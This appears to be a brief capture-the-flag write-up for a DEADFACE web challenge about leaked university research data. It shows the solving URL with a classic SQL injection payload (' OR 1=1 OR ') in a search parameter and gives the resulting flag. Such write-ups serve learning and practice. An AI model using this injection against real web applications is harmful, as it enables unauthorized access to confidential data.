> [!abstract] Challenge Description
> > @syyntax
> ## 60
> NVU had confidential research data that was compromised by DEADFACE and leaked to the public. NVU insists that their confidential data was safeguarded and only provided to authorized users on the web app. See if you can identify the flag associated with the classified research present on the web application.
> 
> Submit the flag as `deadface{flag text}`.
> 
> [http://env01.deadface.io:8080](http://env01.deadface.io:8080/)

The research projects says that search will reveal information. Using the same query as [[+ Not-So-Public Domain]] but swapping it out for research gives the flag.

http://env01.deadface.io:8080/api/search.php?q=%27%20OR%201=1%20OR%20%27&type=research

---
> [!success] Flag: `deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3}`
